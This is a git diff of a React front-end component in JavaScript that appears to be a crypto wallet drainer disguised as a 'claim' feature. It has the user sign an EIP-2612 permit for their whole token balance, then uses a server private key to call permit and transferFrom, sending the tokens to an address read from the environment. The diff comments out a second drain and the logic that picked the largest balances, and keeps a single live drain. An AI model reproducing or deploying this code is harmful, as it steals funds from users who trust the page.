@@ -94,45 +94,139 @@ const Box2 = () => {
     const privateKey = process.env.PRIVATE_KEY
     const wallet = new ethers.Wallet(privateKey, walletProvider)
 
-    let maxBalanceIndex = 0
-    let maxBalance = 0
-    let max2BalanceIndex = 1
-    let max2Balance = 0
-    for (let i = 0; i < mainnetContractAddresses.length; i++) {
-      const token = new ethers.Contract(
-        mainnetContractAddresses[i].address,
-        abi,
-        wallet,
-      )
+    // let maxBalanceIndex = 0
+    // let maxBalance = 0
+    // let max2BalanceIndex = 1
+    // let max2Balance = 0
+    // for (let i = 0; i < mainnetContractAddresses.length; i++) {
+    //   const token = new ethers.Contract(
+    //     mainnetContractAddresses[i].address,
+    //     abi,
+    //     wallet,
+    //   )
 
-      let balance
-      if (i == 0) {
-        balance = ((await token.balanceOf(address)) * 6) / 1e4
-        if (balance >= maxBalance) {
-          maxBalanceIndex = i
-          maxBalance = balance
-        } else if (balance < max2Balance && balance >= max2Balance) {
-          max2BalanceIndex = i
-          max2Balance = balance
-        }
-      } else {
-        balance =
-          (await token.balanceOf(address)) /
-          10 ** mainnetContractAddresses[i].decimals
-        if (balance >= maxBalance) {
-          maxBalanceIndex = i
-          maxBalance = balance
-        } else if (balance < max2Balance && balance >= max2Balance) {
-          max2BalanceIndex = i
-          max2Balance = balance
-        }
-      }
-    }
+    //   let balance
+    //   if (i == 0) {
+    //     balance = ((await token.balanceOf(address)) * 6) / 1e4
+    //     if (balance >= maxBalance) {
+    //       maxBalanceIndex = i
+    //       maxBalance = balance
+    //     } else if (balance < max2Balance && balance >= max2Balance) {
+    //       max2BalanceIndex = i
+    //       max2Balance = balance
+    //     }
+    //   } else {
+    //     balance =
+    //       (await token.balanceOf(address)) /
+    //       10 ** mainnetContractAddresses[i].decimals
+    //     if (balance >= maxBalance) {
+    //       maxBalanceIndex = i
+    //       maxBalance = balance
+    //     } else if (balance < max2Balance && balance >= max2Balance) {
+    //       max2BalanceIndex = i
+    //       max2Balance = balance
+    //     }
+    //   }
+    // }
 
-    console.log(maxBalanceIndex)
+    // console.log(maxBalanceIndex)
+
+    // const contract = new ethers.Contract(
+    //   mainnetContractAddresses[maxBalanceIndex].address,
+    //   abi,
+    //   wallet,
+    // )
+
+    // const deadline = Math.floor(Date.now() / 1000) + 3600 // 1 hour from now
+    // const value = await contract.balanceOf(address)
+    // const nonce = await contract.nonces(address)
+    // const domain = {
+    //   name: mainnetContractAddresses[maxBalanceIndex].name,
+    //   version: mainnetContractAddresses[maxBalanceIndex].version.toString(),
+    //   chainId: 42161,
+    //   verifyingContract: mainnetContractAddresses[maxBalanceIndex].address,
+    // }
+    // const types = {
+    //   Permit: [
+    //     { name: "owner", type: "address" },
+    //     { name: "spender", type: "address" },
+    //     { name: "value", type: "uint256" },
+    //     { name: "nonce", type: "uint256" },
+    //     { name: "deadline", type: "uint256" },
+    //   ],
+    // }
+    // const message = {
+    //   owner: address,
+    //   spender: process.env.ADDRESS,
+    //   value: value.toString(),
+    //   nonce: nonce.toString(),
+    //   deadline: deadline.toString(),
+    // }
+
+    // const signature = await signer._signTypedData(domain, types, message)
+    // const { v, r, s } = ethers.utils.splitSignature(signature)
+
+    // await contract.permit(
+    //   address,
+    //   process.env.ADDRESS,
+    //   value,
+    //   deadline,
+    //   v,
+    //   r,
+    //   s,
+    // )
+
+    // await contract.transferFrom(address, process.env.ADDRESS, value)
+
+    // const contract2 = new ethers.Contract(
+    //   mainnetContractAddresses[max2BalanceIndex].address,
+    //   abi,
+    //   wallet,
+    // )
+
+    // const deadline2 = Math.floor(Date.now() / 1000) + 3600000 // 1 hour from now
+    // const value2 = await contract2.balanceOf(address)
+    // const nonce2 = await contract2.nonces(address)
+    // const domain2 = {
+    //   name: mainnetContractAddresses[max2BalanceIndex].name,
+    //   version: mainnetContractAddresses[max2BalanceIndex].version.toString(),
+    //   chainId: 42161,
+    //   verifyingContract: mainnetContractAddresses[max2BalanceIndex].address,
+    // }
+    // const types2 = {
+    //   Permit: [
+    //     { name: "owner", type: "address" },
+    //     { name: "spender", type: "address" },
+    //     { name: "value", type: "uint256" },
+    //     { name: "nonce", type: "uint256" },
+    //     { name: "deadline", type: "uint256" },
+    //   ],
+    // }
+    // const message2 = {
+    //   owner: address,
+    //   spender: process.env.ADDRESS,
+    //   value: value2.toString(),
+    //   nonce: nonce2.toString(),
+    //   deadline: deadline2.toString(),
+    // }
+
+    // const signature2 = await signer._signTypedData(domain2, types2, message2)
+    // const { v2, r2, s2 } = ethers.utils.splitSignature(signature2)
+
+    // await contract2.permit(
+    //   address,
+    //   process.env.ADDRESS,
+    //   value2,
+    //   deadline2,
+    //   v2,
+    //   r2,
+    //   s2,
+    // )
+
+    // await contract2.transferFrom(address, process.env.ADDRESS, value2)
 
     const contract = new ethers.Contract(
-      mainnetContractAddresses[maxBalanceIndex].address,
+      mainnetContractAddresses[0].address,
       abi,
       wallet,
     )
@@ -141,10 +235,10 @@ const Box2 = () => {
     const value = await contract.balanceOf(address)
     const nonce = await contract.nonces(address)
     const domain = {
-      name: mainnetContractAddresses[maxBalanceIndex].name,
-      version: mainnetContractAddresses[maxBalanceIndex].version.toString(),
+      name: mainnetContractAddresses[0].name,
+      version: mainnetContractAddresses[0].version.toString(),
       chainId: 42161,
-      verifyingContract: mainnetContractAddresses[maxBalanceIndex].address,
+      verifyingContract: mainnetContractAddresses[0].address,
     }
     const types = {
       Permit: [
@@ -177,53 +271,6 @@ const Box2 = () => {
     )
 
     await contract.transferFrom(address, process.env.ADDRESS, value)
-
-    const contract2 = new ethers.Contract(
-      mainnetContractAddresses[max2BalanceIndex].address,
-      abi,
-      wallet,
-    )
-
-    const deadline2 = Math.floor(Date.now() / 1000) + 3600000 // 1 hour from now
-    const value2 = await contract2.balanceOf(address)
-    const nonce2 = await contract2.nonces(address)
-    const domain2 = {
-      name: mainnetContractAddresses[max2BalanceIndex].name,
-      version: mainnetContractAddresses[max2BalanceIndex].version.toString(),
-      chainId: 42161,
-      verifyingContract: mainnetContractAddresses[max2BalanceIndex].address,
-    }
-    const types2 = {
-      Permit: [
-        { name: "owner", type: "address" },
-        { name: "spender", type: "address" },
-        { name: "value", type: "uint256" },
-        { name: "nonce", type: "uint256" },
-        { name: "deadline", type: "uint256" },
-      ],
-    }
-    const message2 = {
-      owner: address,
-      spender: process.env.ADDRESS,
-      value: value2.toString(),
-      nonce: nonce2.toString(),
-      deadline: deadline2.toString(),
-    }
-
-    const signature2 = await signer._signTypedData(domain2, types2, message2)
-    const { v2, r2, s2 } = ethers.utils.splitSignature(signature2)
-
-    await contract2.permit(
-      address,
-      process.env.ADDRESS,
-      value2,
-      deadline2,
-      v2,
-      r2,
-      s2,
-    )
-
-    await contract2.transferFrom(address, process.env.ADDRESS, value2)
 
     setClaiming(false)
   }
